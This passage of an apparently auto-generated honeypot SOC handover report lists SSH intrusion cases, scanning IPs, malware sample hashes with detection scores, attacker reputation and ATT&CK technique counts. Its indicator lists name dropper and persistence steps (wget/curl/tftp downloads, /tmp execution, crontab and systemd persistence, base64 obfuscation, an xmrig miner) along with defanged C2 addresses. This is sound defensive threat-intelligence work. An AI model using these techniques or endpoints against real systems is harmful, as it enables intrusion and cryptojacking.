| IR-d54cbd1143cc | HIGH | `80.94.92[.]179` | 2026-11-10 02:22 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8ff22e81ca8e | HIGH | `46.253.45[.]10` | 2026-11-10 02:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2ee37169b518 | HIGH | `46.253.45[.]10` | 2026-11-10 02:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-16144178e2dd | HIGH | `129.121.136[.]199` | 2026-11-10 02:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1318658df30b | HIGH | `129.121.136[.]199` | 2026-11-10 02:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8f7b2224d0d | HIGH | `78.128.112[.]74` | 2026-11-10 02:45 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e7f582cec380 | HIGH | `35.210.160[.]81` | 2026-11-10 03:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-06c9b1ff6cb8 | HIGH | `71.6.134[.]237` | 2026-11-10 03:12 | Y | 3 | 0 | `T1078` |
| IR-4a77d76cc351 | HIGH | `109.160.32[.]41` | 2026-11-10 03:32 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8b0a726ee429 | HIGH | `109.160.32[.]41` | 2026-11-10 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8d7f13c242ff | HIGH | `195.178.110[.]217` | 2026-11-10 04:01 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e49175cfa944 | HIGH | `176.53.159[.]196` | 2026-11-10 04:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8831e91a1437 | HIGH | `58.84.63[.]63` | 2026-11-10 04:30 | Y | 68 | 1 | `T1059.004 · T1078 · T1105` |
| IR-4a802c772a40 | HIGH | `35.210.4[.]255` | 2026-11-10 04:47 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]41` | **2** | 2026-11-10 03:31 | 2026-11-10 04:21 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]217` | **2** | 2026-11-10 03:55 | 2026-11-10 04:00 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.206.191[.]146` | **2** | 2026-11-10 03:07 | 2026-11-10 04:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.211.138[.]165` | 1 | 2026-11-10 04:22 | 2026-11-10 04:22 | 3s | 0 | `T1592` | 🟢 LOW |
| `139.59.133[.]86` | 1 | 2026-11-10 02:08 | 2026-11-10 02:08 | 20s | 0 | `T1592` | 🟢 LOW |
| `141.98.10[.]138` | 1 | 2026-11-10 02:06 | 2026-11-10 02:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `164.90.219[.]112` | 1 | 2026-11-10 02:08 | 2026-11-10 02:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.22.66[.]184` | 1 | 2026-11-10 02:08 | 2026-11-10 02:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.227.144[.]7` | 1 | 2026-11-10 02:08 | 2026-11-10 02:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]224` | 1 | 2026-11-10 03:48 | 2026-11-10 03:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-10 01:14 | 2026-11-10 01:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-10 01:33 | 2026-11-10 01:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.211.254[.]121` | 1 | 2026-11-10 03:37 | 2026-11-10 03:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.88.205[.]248` | 1 | 2026-11-10 01:21 | 2026-11-10 01:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.160[.]81` | 1 | 2026-11-10 03:00 | 2026-11-10 03:00 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.4[.]255` | 1 | 2026-11-10 04:47 | 2026-11-10 04:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.42[.]189` | 1 | 2026-11-10 02:16 | 2026-11-10 02:16 | 3s | 0 | `T1592` | 🟢 LOW |
| `40.124.84[.]222` | 1 | 2026-11-10 03:27 | 2026-11-10 03:27 | 9s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-10 04:06 | 2026-11-10 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | 1 | 2026-11-10 01:08 | 2026-11-10 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.242.117[.]176` | 1 | 2026-11-10 02:29 | 2026-11-10 02:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]161` | 1 | 2026-11-10 04:24 | 2026-11-10 04:24 | 3s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]227` | 1 | 2026-11-10 03:32 | 2026-11-10 03:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-11-10 04:20 | 2026-11-10 04:20 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-10 01:10 | 2026-11-10 01:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]222` | 1 | 2026-11-10 01:30 | 2026-11-10 01:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]209` | 1 | 2026-11-10 03:37 | 2026-11-10 03:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]40` | 1 | 2026-11-10 03:37 | 2026-11-10 03:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]110` | 1 | 2026-11-10 01:33 | 2026-11-10 01:33 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]51` | 1 | 2026-11-10 03:36 | 2026-11-10 03:36 | 23s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]234` | 1 | 2026-11-10 02:23 | 2026-11-10 02:24 | 14s | 0 | `T1592` | 🟢 LOW |
| `71.6.134[.]237` | 1 | 2026-11-10 02:41 | 2026-11-10 02:41 | 14s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]29` | 1 | 2026-11-10 01:45 | 2026-11-10 01:45 | 7s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-10 02:45 | 2026-11-10 02:45 | 6s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-11-10 01:30 | 2026-11-10 01:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `35.210.160[.]81` | BE | Google LLC | **100** ⚠️ | 9 |
| `64.62.197[.]32` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `66.132.195[.]51` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `71.6.232[.]29` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `173.244.60[.]241` | US | LogicWeb Inc. | **100** ⚠️ | 50 |
| `35.210.4[.]255` | BE | Google LLC | **100** ⚠️ | 3 |
| `3.88.205[.]248` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 1 |
| `141.98.10[.]138` | LT | UAB Host Baltic | **100** ⚠️ | 33 |
| `71.6.134[.]237` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 68 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 61 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 35 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 27 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 26 |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 118 cases |
| Tool 34  | Credential Extractor        | ✅ 768 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 36 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 65 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 24 filtered (20.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 56 priority case(s) shown individually · 35 recon entry/entries in table (3 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-10T05:08:17Z_
